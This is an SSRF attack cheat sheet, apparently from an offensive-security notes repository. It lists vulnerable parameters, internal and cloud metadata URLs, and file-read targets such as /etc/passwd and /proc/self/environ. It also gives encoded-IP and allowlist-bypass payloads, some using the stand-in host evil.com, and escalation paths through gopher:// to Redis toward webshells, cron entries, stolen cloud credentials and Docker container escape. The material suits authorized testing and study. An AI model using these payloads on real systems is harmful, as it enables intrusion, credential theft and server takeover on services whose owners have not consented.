# SSRF

SSRF is a request the server makes on your behalf. The bug is not "it fetches a URL" —
it is "the allowlist is weak".

---

## Where it lives

```
?url=  ?src=  ?image=  ?feed=  ?callback=  ?webhook=  ?proxy=  ?fetch=  ?import=
PDF/screenshot generators  image resizers  link previews  RSS readers  importers
OAuth/SAML metadata URLs  JWT jku/x5u  webhook test buttons  "connect your account"
```

---

## Confirmation first

Always confirm with a DNS callback before anything else:

```
http://<token>.your-collab-domain/
```

If you get a DNS hit, you have SSRF. If you get an HTTP hit, you have full SSRF. If you
get neither but the response changes, you have blind SSRF with a different oracle.

```bash
python3 07-tooling/python/ssrf_probe.py -u 'https://t/fetch?url=' --domain abc.oast.pro
```

---

## Escalation ladder

1. **Internal HTTP**: `http://127.0.0.1/`, `http://localhost:8080/`, `http://[::1]/`
2. **Metadata**: `http://169.254.169.254/latest/meta-data/` (AWS),
   `http://metadata.google.internal/computeMetadata/v1/` (GCP, needs `Metadata-Flavor: Google`),
   `http://169.254.169.254/metadata/instance?api-version=2021-02-01` (Azure, needs `Metadata: true`)
3. **Internal services**: Redis 6379, Elastic 9200, Consul 8500, Docker 2375, kubelet 10250
4. **File read**: `file:///etc/passwd`, `file:///proc/self/environ`
5. **Protocol smuggling**: `gopher://` to Redis/MySQL/SMTP, `dict://`
6. **Cloud creds**: metadata → IAM role → STS → account access

---

## Filter bypass

```
http://127.0.0.1        http://127.1        http://0.0.0.0
http://2130706433       http://0x7f000001   http://0177.0.0.1
http://[::1]            http://[::ffff:127.0.0.1]
http://127.0.0.1.nip.io http://127.0.0.1.sslip.io
http://evil.com@127.0.0.1/          http://127.0.0.1#@evil.com/
http://127.0.0.1%09/    http://127.0.0.1:80@evil.com/
http://evil.com.127.0.0.1.nip.io/
```

Redirect-based: host an open redirect on an allowed domain and 302 to `127.0.0.1`.
DNS-rebinding: a domain that resolves to an allowed IP first, then to `127.0.0.1`.

---

## Allowlist bypass patterns

| Allowlist | Bypass |
|---|---|
| `*.trusted.com` | `trusted.com.evil.com`, `evil.com#@trusted.com` |
| exact string match | `trusted.com@evil.com`, `trusted.com%00.evil.com` |
| regex `^https://trusted` | `https://trusted.evil.com` |
| IP prefix `10.` | `10.0.0.1.nip.io`, `0x0a000001` |
| "no internal IPs" | decimal/octal/hex encodings, IPv6-mapped |

---

## Blind SSRF

No response body? Use:

- DNS callback (proves egress)
- Timing (`http://10.0.0.1` slow = filtered, fast = closed)
- Error text (some apps echo the fetch error)
- Second-order: the fetched content is stored and readable later (image, preview)
- Port scan by timing across `127.0.0.1:1-10000`

---

## Impact escalation

- Metadata creds → `aws sts get-caller-identity` → enumerate → S3/SSM/Secrets
- Internal admin panel → often unauthenticated
- Redis → write a webshell or a cron entry
- GCP metadata → service account token → project access
- Docker API → container escape / host mount

---

## Go deeper

1. Try every scheme: `http`, `https`, `file`, `gopher`, `dict`, `ftp`, `ldap`, `jar`.
2. Try `gopher://` with a raw Redis `SET`/`CONFIG` payload.
3. Try the metadata path with and without the required header.
4. Check whether the fetched content is *stored* — then read it back.
5. Check whether redirects are followed (open redirect on an allowed host = full SSRF).

---

## Related

- `03-bypass/bypass-doctrine.md`
- `00-core/impact-proof.md`
- `11-regex/10-verification.md`
